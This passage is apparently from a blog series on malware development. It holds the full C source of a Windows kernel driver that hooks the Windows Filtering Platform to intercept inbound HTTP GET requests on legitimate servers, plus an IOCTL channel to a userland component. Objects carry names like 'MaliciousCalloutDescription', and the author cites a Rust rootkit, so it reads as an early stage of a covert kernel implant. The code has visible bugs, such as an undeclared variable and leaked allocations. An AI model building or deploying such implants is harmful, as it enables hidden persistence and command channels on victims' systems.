class="hljs-string">&#x27;\0&#x27;</span>;<br />    <span class="hljs-keyword">if</span> (!(tcpPayload[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span> &amp;&amp; tcpPayload[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;E&#x27;</span> &amp;&amp; tcpPayload[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;T&#x27;</span>)) {<br />        KdPrint((<span class="hljs-string">&quot;  - [!] Discarding the packet due to not GET request\n&quot;</span>));<br />        <span class="hljs-keyword">return</span>;<br />    }<br /><br />    KdPrint((<span class="hljs-string">&quot;packet: %s\n&quot;</span>, tcpPayload));</span></pre><p name="b2bd" id="b2bd" class="graf graf--p graf-after--pre">The above code works to filter for only data containing “GET”, more advanced filtering will need to be done in a later instalment, but for now, we have a working PoC for the most difficult and worst documented part of the project.</p><h3 name="1dc3" id="1dc3" class="graf graf--h3 graf-after--p">Implementing user mode to kernel communication</h3><h4 name="80fb" id="80fb" class="graf graf--h4 graf-after--h3">Research</h4><p name="1a53" id="1a53" class="graf graf--p graf-after--h4">What is it we are trying to do: we are trying to send messages between user-mode and kernel so that we can use user-mode code for tasks where kernel-level privileges are not required. We will be doing this as the kernel is a dangerous place where we cannot use many of our favourite libraries and tricks… so in other words it&#39;s easier.</p><p name="c337" id="c337" class="graf graf--p graf-after--p">Doing a quick bit of digging, I found this article, which goes through which mechanisms are available for kernel-to-user-mode communication[6].</p><div name="3149" id="3149" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://stackoverflow.com/questions/53086355/driver-to-user-mode-communication" data-href="https://stackoverflow.com/questions/53086355/driver-to-user-mode-communication" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://stackoverflow.com/questions/53086355/driver-to-user-mode-communication"><strong class="markup--strong markup--mixtapeEmbed-strong">Driver to User-Mode Communication</strong><br><em class="markup--em markup--mixtapeEmbed-em">I am trying to write a tool to monitor processes. Whenever a high privileged process with SYSTEM privileges is created…</em>stackoverflow.com</a><a href="https://stackoverflow.com/questions/53086355/driver-to-user-mode-communication" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="a5af117e1214712f8f58b9b81d1d09ca" data-thumbnail-img-id="0*c_MPXuaiC5rVh94H" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*c_MPXuaiC5rVh94H);"></a></div><p name="9174" id="9174" class="graf graf--p graf-after--mixtapeEmbed">It mentioned Device Input and Output Control (IOCTL), which as Microsoft describes it is[7]:</p><blockquote name="bbfb" id="bbfb" class="graf graf--blockquote graf--startsWithDoubleQuote graf-after--p">“The <a href="https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol" data-href="https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol" class="markup--anchor markup--blockquote-anchor" rel="noopener" target="_blank">DeviceIoControl</a> function provides a device input and output control (IOCTL) interface through which an application can communicate directly with a device driver.”</blockquote><div name="a9dc" id="a9dc" class="graf graf--mixtapeEmbed graf-after--blockquote"><a href="https://learn.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-" data-href="https://learn.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://learn.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-"><strong class="markup--strong markup--mixtapeEmbed-strong">Device Input and Output Control (IOCTL) - Win32 apps</strong><br><em class="markup--em markup--mixtapeEmbed-em">The DeviceIoControl function provides a device input and output control (IOCTL) interface through which an application…</em>learn.microsoft.com</a><a href="https://learn.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="802720f17d67fc12be9493d01bcd8719" data-thumbnail-img-id="0*K6FCSBRyFe9zenZz" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*K6FCSBRyFe9zenZz);"></a></div><p name="eaff" id="eaff" class="graf graf--p graf-after--mixtapeEmbed">Also digging into this example shows that they are using the same functionality for communication [8].</p><div name="a9db" id="a9db" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://github.com/memN0ps/rootkit-rs/blob/master/driver/src/lib.rs" data-href="https://github.com/memN0ps/rootkit-rs/blob/master/driver/src/lib.rs" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://github.com/memN0ps/rootkit-rs/blob/master/driver/src/lib.rs"><strong class="markup--strong markup--mixtapeEmbed-strong">rootkit-rs/driver/src/lib.rs at master · memN0ps/rootkit-rs</strong><br><em class="markup--em markup--mixtapeEmbed-em">Rusty Rootkit - Windows Kernel Rookit in Rust (Codename: Eagle) - rootkit-rs/driver/src/lib.rs at master ·…</em>github.com</a><a href="https://github.com/memN0ps/rootkit-rs/blob/master/driver/src/lib.rs" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="856938749c90c067eb89a88e7ba3d7a7" data-thumbnail-img-id="0*jJ7rkx50DZ74koB7" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*jJ7rkx50DZ74koB7);"></a></div><p name="64cb" id="64cb" class="graf graf--p graf-after--mixtapeEmbed">So what are the specific requirements of what we are trying to do? Well at the most basic level, we are trying to send data from the kernel to a program running in user space. As with so many other times with pen-testing and malware dev. ired has our backs again [9].</p><div name="b67f" id="b67f" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/sending-commands-from-userland-to-your-kernel-driver-using-ioctl" data-href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/sending-commands-from-userland-to-your-kernel-driver-using-ioctl" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/sending-commands-from-userland-to-your-kernel-driver-using-ioctl"><strong class="markup--strong markup--mixtapeEmbed-strong">Sending Commands From Your Userland Program to Your Kernel Driver using IOCTL</strong><br><em class="markup--em markup--mixtapeEmbed-em">Windows Driver Model (WDM)</em>www.ired.team</a><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/sending-commands-from-userland-to-your-kernel-driver-using-ioctl" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="1e855b6b1923658bd298878d986f814c" data-thumbnail-img-id="0*KPDSeOZfKkB6Y6WA" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*KPDSeOZfKkB6Y6WA);"></a></div><h4 name="2219" id="2219" class="graf graf--h4 graf-after--mixtapeEmbed">PoC</h4><p name="cd36" id="cd36" class="graf graf--p graf-after--h4">Now we have an idea of what we are trying to do, and a grasp on how we are going to do it, so let&#39;s get started and throw together a PoC.</p><p name="8ff7" id="8ff7" class="graf graf--p graf-after--p">For the PoC we just implement the code from ired, and voila we have communication!</p><figure name="7c7b" id="7c7b" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*krUkQQ7TqFv1pB2BZTac3w.png" data-width="650" data-height="347" src="https://cdn-images-1.medium.com/max/800/1*krUkQQ7TqFv1pB2BZTac3w.png"><figcaption class="imageCaption">Client user communication</figcaption></figure><h3 name="4083" id="4083" class="graf graf--h3 graf-after--figure">Conclusion</h3><p name="ed3e" id="ed3e" class="graf graf--p graf-after--h3">This concludes what we set out to achieve for this post, and we now have a kernel driver where we can interact with a userland program and intercept HTTP communication of legitimate servers. Below the code, there is a section containing a list of references used in this post and a brief note for each.</p><p name="5d5f" id="5d5f" class="graf graf--p graf-after--p">The final code ended up looking like this:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="csharp" name="10f2" id="10f2" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-meta">#include &lt;ntddk.h&gt;</span><br /><span class="hljs-comment">// Network driver headers (version 6.30)</span><br /><span class="hljs-meta">#<span class="hljs-keyword">define</span> NDIS630</span><br /><span class="hljs-meta">#include &lt;ndis.h&gt;</span><br /><br /><span class="hljs-comment">// WFP headers</span><br /><span class="hljs-meta">#include &lt;fwpmk.h&gt;</span><br /><span class="hljs-meta">#include &lt;fwpsk.h&gt;</span><br /><span class="hljs-meta">#include &lt;fwpmu.h&gt;</span><br /><br /><span class="hljs-comment">// GUID headers</span><br /><span class="hljs-comment">// https://www.gamedev.net/forums/topic/18905-initguid-an-explanation/</span><br /><span class="hljs-meta">#<span class="hljs-keyword">define</span> INITGUID</span><br /><span class="hljs-meta">#include &lt;guiddef.h&gt;</span><br /><br />DEFINE_GUID(CALLOUT_GUID, <span class="hljs-number">0x8aadb11d</span>, <span class="hljs-number">0xe10e</span>, <span class="hljs-number">0x480d</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xe6</span>);<br />DEFINE_GUID(SUB_LAYER_GUID, <span class="hljs-number">0xa7e76cdd</span>, <span class="hljs-number">0x5b2e</span>, <span class="hljs-number">0x4ffd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xe7</span>);<br /><br />PDEVICE_OBJECT  filterDeviceObject; <span class="hljs-comment">// Device object for the filter engine</span><br />HANDLE          engineHandle;       <span class="hljs-comment">// Handle to the filter engine</span><br />UINT32          registerCalloutId;  <span class="hljs-comment">// Identifier of the registered callout</span><br />UINT32          addCalloutId;       <span class="hljs-comment">// Identifier of the added callout</span><br />UINT64          filterId;           <span class="hljs-comment">// Identifier of the added filter</span><br /><br /><br /><span class="hljs-function">NTSTATUS  <span class="hljs-title">WfpInit</span>(<span class="hljs-params">PDRIVER_OBJECT driverObject</span>)</span>;<br /><br /><span class="hljs-function">NTSTATUS  <span class="hljs-title">CalloutRegister</span>()</span>;<br /><span class="hljs-function">NTSTATUS  <span class="hljs-title">CalloutAdd</span>()</span>;<br /><br /><span class="hljs-function">VOID      <span class="hljs-title">CalloutFilter</span>(<span class="hljs-params"><span class="hljs-keyword">const</span> FWPS_INCOMING_VALUES* inFixedValues, <span class="hljs-keyword">const</span> FWPS_INCOMING_METADATA_VALUES* inMetaValues, <span class="hljs-keyword">void</span>* layerData, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>* classifyContext, <span class="hljs-keyword">const</span> FWPS_FILTER* filter, UINT64 flowContext, FWPS_CLASSIFY_OUT* classifyOut</span>)</span>;<br /><span class="hljs-function">NTSTATUS  <span class="hljs-title">CalloutNotify</span>(<span class="hljs-params">FWPS_CALLOUT_NOTIFY_TYPE notifyType, <span class="hljs-keyword">const</span> GUID* filterKey, FWPS_FILTER* filter</span>)</span>;<br /><br /><span class="hljs-function">NTSTATUS  <span class="hljs-title">SublayerAdd</span>()</span>;<br /><span class="hljs-function">NTSTATUS  <span class="hljs-title">FilterAdd</span>()</span>;<br /><br /><span class="hljs-function">VOID <span class="hljs-title">TermFilterDeviceObject</span>()</span>;<br /><span class="hljs-function">VOID <span class="hljs-title">TermCalloutData</span>()</span>;<br /><span class="hljs-function">VOID <span class="hljs-title">TermWfpEngine</span>()</span>;<br /><span class="hljs-function">VOID <span class="hljs-title">WfpCleanup</span>()</span>;<br /><br /><br /><span class="hljs-comment">// imports for kernel to usermode communication</span><br /><br /><span class="hljs-meta">#include &lt;wdm.h&gt;</span><br /><br />DRIVER_DISPATCH HandleCustomIOCTL;<br /><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOCTL_SPOTLESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2049, METHOD_BUFFERED, FILE_ANY_ACCESS)</span><br />UNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L<span class="hljs-string">&quot;\\Device\\Sn33kDevice&quot;</span>);<br />UNICODE_STRING DEVICE_SYMBOLIC_NAME = RTL_CONSTANT_STRING(L<span class="hljs-string">&quot;\\??\\Sn33kDeviceLink&quot;</span>);<br /><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">HandleCustomIOCTL</span>(<span class="hljs-params">PDEVICE_OBJECT DeviceObject, PIRP Irp</span>)</span><br />{<br />    UNREFERENCED_PARAMETER(DeviceObject);<br />    PIO_STACK_LOCATION stackLocation = NULL;<br />    CHAR* messageFromKernel = <span class="hljs-string">&quot;ohai from them kernelz&quot;</span>;<br /><br />    stackLocation = IoGetCurrentIrpStackLocation(Irp);<br /><br />    <span class="hljs-keyword">if</span> (stackLocation-&gt;Parameters.DeviceIoControl.IoControlCode == IOCTL_SPOTLESS)<br />    {<br />        KdPrint((<span class="hljs-string">&quot;IOCTL_SPOTLESS (0x%x) issued\n&quot;</span>, stackLocation-&gt;Parameters.DeviceIoControl.IoControlCode));<br />        KdPrint((<span class="hljs-string">&quot;Input received from userland: %s\n&quot;</span>, (<span class="hljs-built_in">char</span>*)Irp-&gt;AssociatedIrp.SystemBuffer));<br />    }<br /><br />    Irp-&gt;IoStatus.Information = strlen(messageFromKernel);<br />    Irp-&gt;IoStatus.Status = STATUS_SUCCESS;<br /><br />    KdPrint((<span class="hljs-string">&quot;Sending to userland: %s\n&quot;</span>, messageFromKernel));<br />    RtlCopyMemory(Irp-&gt;AssociatedIrp.SystemBuffer, messageFromKernel, strlen(Irp-&gt;AssociatedIrp.SystemBuffer));<br /><br />    IoCompleteRequest(Irp, IO_NO_INCREMENT);<br /><br />    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br />}<br /><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">MajorFunctions</span>(<span class="hljs-params">PDEVICE_OBJECT DeviceObject, PIRP Irp</span>)</span><br />{<br />    UNREFERENCED_PARAMETER(DeviceObject);<br /><br />    PIO_STACK_LOCATION stackLocation = NULL;<br />    stackLocation = IoGetCurrentIrpStackLocation(Irp);<br /><br />    <span class="hljs-keyword">switch</span> (stackLocation-&gt;MajorFunction)<br />    {<br />    <span class="hljs-keyword">case</span> IRP_MJ_CREATE:<br />        KdPrint((<span class="hljs-string">&quot;Handle to symbolink link %wZ opened\n&quot;</span>, DEVICE_SYMBOLIC_NAME));<br />        <span class="hljs-keyword">break</span>;<br />    <span class="hljs-keyword">case</span> IRP_MJ_CLOSE:<br />        KdPrint((<span class="hljs-string">&quot;Handle to symbolink link %wZ closed\n&quot;</span>, DEVICE_SYMBOLIC_NAME));<br />        <span class="hljs-keyword">break</span>;<br />    <span class="hljs-literal">default</span>:<br />        <span class="hljs-keyword">break</span>;<br />    }<br /><br />    Irp-&gt;IoStatus.Information = <span class="hljs-number">0</span>;<br />    Irp-&gt;IoStatus.Status = STATUS_SUCCESS;<br />    IoCompleteRequest(Irp, IO_NO_INCREMENT);<br /><br />    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br />}<br /><br /><br /><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverUnload</span>(<span class="hljs-params">_In_ PDRIVER_OBJECT driverObject</span>)</span> {<br />    UNREFERENCED_PARAMETER(driverObject);<br /><br />    WfpCleanup();<br />    KdPrint((<span class="hljs-string">&quot;[+] Unloaded WFP components\n&quot;</span>));<br /><br />    KdPrint((<span class="hljs-string">&quot;[+] Driver unloaded, deleting symbolic links and devices&quot;</span>));<br />    IoDeleteDevice(driverObject-&gt;DeviceObject);<br />    IoDeleteSymbolicLink(&amp;DEVICE_SYMBOLIC_NAME);<br /><br />    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br />}<br /><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span>(<span class="hljs-params">_In_ PDRIVER_OBJECT driverObject, _In_ PUNICODE_STRING registryPath</span>)</span> {<br />    UNREFERENCED_PARAMETER(registryPath);<br />    NTSTATUS status = <span class="hljs-number">0</span>;<br /><br />    KdPrint((<span class="hljs-string">&quot;[+] Hello World!\n&quot;</span>));<br />    driverObject-&gt;DriverUnload = DriverUnload;<br />    <span class="hljs-comment">// Userland I/O</span><br />    KdPrint((<span class="hljs-string">&quot;[+] Registering userland I/O\n&quot;</span>));<br />    <span class="hljs-comment">// Routine for handeling requests from userland</span><br />    driverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = HandleCustomIOCTL;<br />    <span class="hljs-comment">// Routines that will be executed once a handle to our device is opened/closed</span><br />    driverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MajorFunctions;<br />    driverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MajorFunctions;<br /><br />    KdPrint((<span class="hljs-string">&quot;[+] I/O device loaded\n&quot;</span>));<br />    IoCreateDevice(driverObject, <span class="hljs-number">0</span>, &amp;DEVICE_NAME, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &amp;driverObject-&gt;DeviceObject);<br />    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {<br />        KdPrint((<span class="hljs-string">&quot;Could not create device %wZ\n&quot;</span>, DEVICE_NAME));<br />    }<br />    <span class="hljs-keyword">else</span> {<br />        KdPrint((<span class="hljs-string">&quot;Device %wZ created\n&quot;</span>, DEVICE_NAME));<br />    }<br /><br />    status = IoCreateSymbolicLink(&amp;DEVICE_SYMBOLIC_NAME, &amp;DEVICE_NAME);<br />    <span class="hljs-keyword">if</span> (NT_SUCCESS(status)) {<br />        KdPrint((<span class="hljs-string">&quot;Symbolic link %wZ created\n&quot;</span>, DEVICE_SYMBOLIC_NAME));<br />    }<br />    <span class="hljs-keyword">else</span> {<br />        KdPrint((<span class="hljs-string">&quot;Error creating symbolic link %wZ\n&quot;</span>, DEVICE_SYMBOLIC_NAME));<br />    }<br /><br />    <span class="hljs-comment">// WFP</span><br />    KdPrint((<span class="hljs-string">&quot;[+] Registering WFP driver!\n&quot;</span>));<br />    <span class="hljs-keyword">if</span> (!(NT_SUCCESS(WfpInit(driverObject)))) {<br />        KdPrint((<span class="hljs-string">&quot;[ERROR] Driver failed to load!\n&quot;</span>));<br />        <span class="hljs-keyword">return</span> STATUS_UNSUCCESSFUL;<br />    }<br />    KdPrint((<span class="hljs-string">&quot;[+] Driver loaded!\n&quot;</span>));<br />    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br />}<br /><br /><span class="hljs-comment">/*<br />Create a device object (used for the callout registration)<br />Open a session to the filter engine<br />Register a callout with the filter engine<br />Add the callout to the system<br />Add a sublayer to the system<br />Create a filter for the sublayer<br />*/</span><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">FilterAdd</span>()</span> {<br />    filterId = <span class="hljs-number">0</span>;                                              <span class="hljs-comment">// Initialize the filterId to 0</span><br />    UINT64      weightValue = <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>;                             <span class="hljs-comment">// Max UINT64 value</span><br />    FWP_VALUE   weight = { .type = FWP_UINT64, .uint64 = &amp;weightValue }; <span class="hljs-comment">// Weight variable, higher weight means higher priority</span><br />    <span class="hljs-comment">//FWPM_FILTER_CONDITION conditions[1] = { 0 };                              // Filter conditions can be empty, we want to process every packet</span><br />    <span class="hljs-comment">// Added filter condition since we only care about TCP</span><br /><br />    <span class="hljs-comment">// Filter condition structure: https://learn.microsoft.com/en-us/windows/win32/api/fwpmtypes/ns-fwpmtypes-fwpm_filter_condition0</span><br />    <span class="hljs-comment">// Match type: https://learn.microsoft.com/en-us/windows/win32/api/fwptypes/ne-fwptypes-fwp_match_type</span><br />    <span class="hljs-comment">// Condition value: https://learn.microsoft.com/en-us/windows/win32/api/fwptypes/ns-fwptypes-fwp_condition_value0</span><br />    <span class="hljs-comment">// Condition identifier: https://learn.microsoft.com/en-us/windows/win32/fwp/filtering-condition-identifiers-</span><br />    FWPM_FILTER_CONDITION0 conditions[<span class="hljs-number">2</span>] =<br />    {<br />      {FWPM_CONDITION_IP_PROTOCOL, {<span class="hljs-number">0x6</span>}, {<span class="hljs-number">0x0</span>}},     <span class="hljs-comment">// TCP  (0x6)</span><br />      {FWPM_CONDITION_DIRECTION, {FWP_DIRECTION_INBOUND}, {FWP_DIRECTION_INBOUND}}, <span class="hljs-comment">// Only capture incomming traffic</span><br />    };<br />    FWPM_FILTER filter = {<br />      .displayData.name = L<span class="hljs-string">&quot;SN3K drivr&quot;</span>,<br />      .displayData.name = L<span class="hljs-string">&quot;SN3K drivr Description&quot;</span>,<br />      .layerKey = FWPM_LAYER_INBOUND_TRANSPORT_V4,  <span class="hljs-comment">// Needs to work on the same layer as our added callout</span><br />      .subLayerKey = SUB_LAYER_GUID,                   <span class="hljs-comment">// Unique GUID that identifies the sublayer, GUID needs to be the same as the GUID of the added sublayer</span><br />      .weight = weight,                           <span class="hljs-comment">// Weight variable, higher weight means higher priority</span><br />      .numFilterConditions = <span class="hljs-number">0</span>,                                <span class="hljs-comment">// Number of filter conditions (0 because conditions variable is empty)</span><br />      .filterCondition = conditions,                       <span class="hljs-comment">// Empty conditions structure (we don&#x27;t want to do any filtering) </span><br />      .action.type = FWP_ACTION_CALLOUT_INSPECTION,    <span class="hljs-comment">// We only want to inspect the packet (https://learn.microsoft.com/en-us/windows/win32/api/fwpmtypes/ns-fwpmtypes-fwpm_action0)</span><br />      .action.calloutKey = CALLOUT_GUID                      <span class="hljs-comment">// Unique GUID that identifies the callout, GUID needs to be the same as the GUID of the added callout</span><br />    };<br /><br />    <span class="hljs-keyword">return</span> FwpmFilterAdd(engineHandle, &amp;filter, NULL, &amp;filterId);<br />}<br /><span class="hljs-comment">// Boilerplate</span><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">SublayerAdd</span>()</span> {<br /><br />    FWPM_SUBLAYER sublayer = {<br />      .displayData.name = L<span class="hljs-string">&quot;SN3KSublayerName&quot;</span>,<br />      .displayData.name = L<span class="hljs-string">&quot;MaliciousSublayerDescription&quot;</span>,<br />      .subLayerKey = SUB_LAYER_GUID,         <span class="hljs-comment">// Unique GUID that identifies the sublayer</span><br />      .weight = <span class="hljs-number">65535</span>                   <span class="hljs-comment">// Max UINT16 value, higher weight means higher priority</span><br />    };<br /><br />    <span class="hljs-keyword">return</span> FwpmSubLayerAdd(engineHandle, &amp;sublayer, NULL);<br />}<br /><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">CalloutAdd</span>()</span> {<br />    addCalloutId = <span class="hljs-number">0</span>;<br /><br />    FWPM_CALLOUT callout = {<br />      .flags = <span class="hljs-number">0</span>,                                <span class="hljs-comment">// None</span><br />      .displayData.name = L<span class="hljs-string">&quot;SN3KCalloutName&quot;</span>,<br />      .displayData.description = L<span class="hljs-string">&quot;MaliciousCalloutDescription&quot;</span>,<br />      .calloutKey = CALLOUT_GUID,                     <span class="hljs-comment">// The GUID that uniquely identifies the callout (must match the registered FWPS_CALLOUT GUID)</span><br />      .applicableLayer = FWPM_LAYER_INBOUND_TRANSPORT_V4<br />    };<br /><br />    <span class="hljs-keyword">return</span> FwpmCalloutAdd(engineHandle, &amp;callout, NULL, &amp;addCalloutId);<br />}<br /><span class="hljs-comment">// Boilerplate</span><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">CalloutNotify</span>(<span class="hljs-params"><br />    FWPS_CALLOUT_NOTIFY_TYPE  notifyType,<br />    <span class="hljs-keyword">const</span> GUID* filterKey,<br />    FWPS_FILTER* filter<br /></span>)</span> {<br />    UNREFERENCED_PARAMETER(notifyType);<br />    UNREFERENCED_PARAMETER(filterKey);<br />    UNREFERENCED_PARAMETER(filter);<br /><br />    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br />}<br /><br /><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALLOC_TAG_NAME (ULONG)&#x27;TG_1&#x27; // Tag to identify the memory pool</span><br /><span class="hljs-comment">// https://learn.microsoft.com/en-us/windows-hardware/drivers/network/using-a-callout-for-deep-inspection</span><br /><span class="hljs-function">VOID NTAPI <span class="hljs-title">ClassifyFn</span>(<span class="hljs-params"><br />    <span class="hljs-keyword">const</span> FWPS_INCOMING_VALUES* inFixedValues,<br />    <span class="hljs-keyword">const</span> FWPS_INCOMING_METADATA_VALUES* inMetaValues,<br />    <span class="hljs-keyword">void</span>* layerData,<br />    <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>* classifyContext,<br />    <span class="hljs-keyword">const</span> FWPS_FILTER* filter,<br />    UINT64  flowContext,<br />    FWPS_CLASSIFY_OUT* classifyOut<br /></span>)</span><br />{<br />    UNREFERENCED_PARAMETER(inFixedValues);<br />    UNREFERENCED_PARAMETER(inMetaValues);<br />    UNREFERENCED_PARAMETER(layerData);<br />    UNREFERENCED_PARAMETER(classifyContext);<br />    UNREFERENCED_PARAMETER(filter);<br />    UNREFERENCED_PARAMETER(flowContext);<br />    UNREFERENCED_PARAMETER(classifyOut);<br /><br />    <span class="hljs-comment">// Data validation</span><br />    <span class="hljs-keyword">if</span> (!layerData) { <span class="hljs-comment">// Can sometimes be NULL according to documentation</span><br />        <span class="hljs-keyword">return</span>;<br />    }<br />    <span class="hljs-keyword">if</span> (inMetaValues-&gt;ipHeaderSize &lt;= <span class="hljs-number">0</span>) { <span class="hljs-comment">// Probably needed?</span><br />        <span class="hljs-keyword">return</span>;<br />    }<br /><br />    <span class="hljs-comment">// read data</span><br />    <span class="hljs-comment">// https://stackoverflow.com/questions/63040275/how-can-i-read-the-received-packets-with-a-ndis-filter-driver</span><br />    NET_BUFFER_LIST* fragmentList = (NET_BUFFER_LIST*)layerData;<br />    <span class="hljs-comment">// Note: the linked list should ONLY be accessed through macros such as &#x27;NET_BUFFER_LIST_FIRST_NB()&#x27; (https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/nbl/ns-nbl-net_buffer_list)</span><br />    NET_BUFFER* firstFragment = NET_BUFFER_LIST_FIRST_NB(fragmentList);<br />    UNREFERENCED_PARAMETER(firstFragment);<br />    ULONG tcpLength = firstFragment-&gt;DataLength;<br />    UINT32 dataLength = tcpLength;<br /><br />    <span class="hljs-comment">// TCP fragmentation: https://www.baeldung.com/cs/tcp-max-packet-size#:~:text=The%20maximum%20size%20of%20a,size%20should%20never%20exceed%20MTU.</span><br />    <span class="hljs-keyword">if</span> (dataLength &lt;= <span class="hljs-number">4</span> || dataLength &gt;= <span class="hljs-number">65535</span>) {<br />        <span class="hljs-keyword">return</span>;<br />    }<br />    UNREFERENCED_PARAMETER(dataLength);<br />    <span class="hljs-comment">// Allocate memory for the TCP packet</span><br />    PVOID packageBuffer = ExAllocatePoolWithTag(POOL_FLAG_NON_PAGED, (SIZE_T)dataLength, ALLOC_TAG_NAME); <span class="hljs-comment">// Tag name is defined in &quot;Config.h&quot;</span><br />    <span class="hljs-keyword">if</span> (!packageBuffer) {<br />        <span class="hljs-keyword">return</span>;<br />    }<br />    <span class="hljs-comment">// Read the bytes of the TCP packet</span><br />    PBYTE packet = (PBYTE)NdisGetDataBuffer(firstFragment, (ULONG)dataLength, packageBuffer, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br />    UNREFERENCED_PARAMETER(packet);<br /><br />    <span class="hljs-comment">// If the packet is not valid then we are discarding the request</span><br />    <span class="hljs-keyword">if</span> (!packet) {<br />        ExFreePoolWithTag((PVOID)packageBuffer, ALLOC_TAG_NAME);<br />        <span class="hljs-keyword">return</span>;<br />    }<br />    <span class="hljs-comment">// Allocate memory for the payload</span><br />    LPSTR tcpPayload = ExAllocatePoolWithTag(POOL_FLAG_NON_PAGED, (SIZE_T)(dataLength + <span class="hljs-number">1</span>), ALLOC_TAG_NAME); <span class="hljs-comment">//+1 for &#x27;\0&#x27;</span><br />    <span class="hljs-keyword">if</span> (!tcpPayload) {<br />        <span class="hljs-keyword">return</span>;<br />    }<br />    <span class="hljs-comment">// Extract the payload from the TCP packet (bytes after the flag)</span><br />    RtlZeroMemory(tcpPayload, dataLength + <span class="hljs-number">1</span>);<br />    RtlCopyMemory(tcpPayload, &amp;packet[<span class="hljs-number">0</span>], dataLength);<br /><br />    <span class="hljs-comment">// Null terminate the payload for extra safety</span><br />    tcpPayload[payloadLength] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br />    <span class="hljs-keyword">if</span> (!(tcpPayload[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span> &amp;&amp; tcpPayload[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;E&#x27;</span> &amp;&amp; tcpPayload[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;T&#x27;</span>)) {<br />        KdPrint((<span class="hljs-string">&quot;  - [!] Discarding the packet due to not GET request\n&quot;</span>));<br />        <span class="hljs-keyword">return</span>;<br />    }<br /><br /><br />    <span class="hljs-comment">// add functionality for further packet inspection, but for now we just extract the message and add to queue in the form of a dynamic array</span><br /><br />    <span class="hljs-comment">// we need to figure out how to dynamic array to act as our queue for requests</span><br />    <span class="hljs-comment">// list of pointers to strings - the strings being the commands</span><br />    KdPrint((<span class="hljs-string">&quot;packet: %s\n&quot;</span>, tcpPayload));<br />}<br /><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">CalloutRegister</span>()</span> {<br />    registerCalloutId = <span class="hljs-number">0</span>;<br /><br />    FWPS_CALLOUT callout = {<br />      .calloutKey = CALLOUT_GUID,    <span class="hljs-comment">// Unique GUID that identifies the callout (previously defined)</span><br />      .flags = <span class="hljs-number">0</span>,               <span class="hljs-comment">// None</span><br />      .classifyFn = ClassifyFn, <span class="hljs-comment">//CalloutFilter,   // Callout function used to process network data (our ICMP packets)</span><br />      .notifyFn = CalloutNotify,   <span class="hljs-comment">// Callout function used to receive notifications from the filter engine (MUST be defined)</span><br />      .flowDeleteFn = NULL   